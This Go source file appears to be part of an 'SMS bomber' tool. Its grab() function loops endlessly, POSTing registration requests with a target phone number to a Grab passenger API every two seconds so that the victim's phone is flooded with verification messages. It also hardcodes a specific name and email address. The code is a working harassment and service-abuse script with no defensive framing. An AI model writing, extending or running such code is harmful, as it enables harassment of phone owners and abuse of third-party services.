package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func grab() {
	req := newreq()
	req.SetBodyString("phoneNumber=" + num + "&countryCode=ID&name=Alexey&email=alexey173949%40gmail.com&deviceToken=*")
	req.SetRequestURI("https://p.grabtaxi.com/api/passenger/v2/profiles/register")
	req.Header.SetMethod("POST")

	timeout := time.Second * 2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), "phoneNumber") != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
